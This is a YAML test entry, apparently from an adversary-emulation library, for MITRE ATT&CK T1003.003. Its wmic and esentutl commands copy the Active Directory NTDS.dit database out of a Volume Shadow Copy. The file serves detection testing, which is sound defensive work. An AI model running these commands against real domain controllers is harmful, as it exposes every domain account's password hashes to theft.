- id: 1a07576d-b67e-5029-9c20-96a9b2e6d092
  name: Soumaia ART Tests - Create Volume Shadow Copy remotely (WMI) with esentutl
  description: 'This test is intended to be run from a remote workstation with domain admin context.

    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.003
    name: 'OS Credential Dumping: NTDS'
  platforms:
    windows:
      cmd:
        command: |-
          cmd /c "wmic /node:""localhost"" shadowcopy list brief"
          if not "%ERRORLEVEL%"=="0" (
              cmd /c "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)"
          )
          wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
